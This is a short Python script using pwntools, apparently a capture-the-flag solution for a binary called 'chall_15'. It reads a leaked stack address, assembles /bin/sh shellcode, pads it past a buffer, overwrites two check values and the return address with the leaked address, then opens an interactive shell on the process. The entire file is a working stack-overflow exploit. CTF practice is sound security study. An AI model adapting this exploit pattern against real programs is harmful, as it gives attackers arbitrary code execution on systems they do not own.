from pwn import *
elf=ELF("./chall_15")
context.arch="amd64"
shellcode = asm(shellcraft.sh())
r=process("./chall_15")
r.recvuntil(b'\n')
leak = r.recv()
stackleak = int(leak,16)
execution= shellcode+b's'*232+p32(0xdeadd00d)+p32(0xb16b00b5)+b's'*8+p64(stackleak)
r.sendline(execution)
r.interactive()
r.close()
